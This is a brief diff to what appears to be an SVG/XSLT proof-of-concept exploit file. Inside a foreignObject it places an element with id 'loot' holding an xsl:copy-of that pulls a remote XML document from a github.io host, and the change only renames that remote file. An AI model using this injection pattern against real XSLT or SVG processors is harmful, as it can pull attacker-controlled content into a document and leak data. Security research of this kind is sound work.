@@ -6,7 +6,7 @@
         <foreignObject class="node" font-size="14" width="100%" height="200%">
             <body xmlns="http://www.w3.org/1999/xhtml">
                 <xmp id="loot">
-                    <xsl:copy-of select="document('https://1u0hun.github.io/poc1.xml')"/>
+                    <xsl:copy-of select="document('https://1u0hun.github.io/poc_1.xml')"/>
                 </xmp>
             </body>
         </foreignObject>
